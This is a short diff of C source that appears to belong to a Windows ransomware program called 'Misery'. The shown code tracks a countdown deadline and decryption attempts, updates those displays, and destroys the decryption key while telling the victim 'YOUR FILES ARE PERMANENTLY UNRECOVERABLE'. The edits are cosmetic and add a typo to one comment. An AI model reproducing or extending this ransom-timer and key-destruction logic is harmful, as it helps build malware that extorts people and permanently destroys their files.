@@ -2,13 +2,13 @@
 #include "../crypto.h"          /* CleanupCrypto */
 #include "../misery_config.h"   /* MiseryLog */
 
-/* ------------------------------------------------------------------ */
+
 /* State variables                                                     */
-/* ------------------------------------------------------------------ */
+
 ULONGLONG g_timerEndFileTime = 0;
 int       g_decryptAttempts  = 0;
 
-/* UpdateTimerDisplay — unchanged */
+/* UpdateTimerDisplay  */
 void UpdateTimerDisplay(HWND hWnd) {
     FILETIME ftNow;
     GetSystemTimeAsFileTime(&ftNow);
@@ -31,7 +31,7 @@ void UpdateTimerDisplay(HWND hWnd) {
     SetDlgItemTextA(hWnd, IDC_TIMER, timeBuf);
 }
 
-/* UpdateAttemptsDisplay — unchanged */
+/* UpdateAttemptsDisplayd */
 void UpdateAttemptsDisplay(HWND hWnd) {
     char buf[64];
     snprintf(buf, sizeof(buf), "Attempts: %d / %d",
@@ -72,7 +72,7 @@ void DestroyKeyAndClose(HWND hWnd) {
     CleanupCrypto();
 
     MessageBoxA(hWnd,
-        "TIME EXPIRED — The decryption key has been destroyed.\n"
+        "TIME EXPIRED  The decryption key has been destroyed.\n"
         "YOUR FILES ARE PERMANENTLY UNRECOVERABLE.",
         "FILES LOST FOREVER", MB_OK | MB_ICONERROR);
 
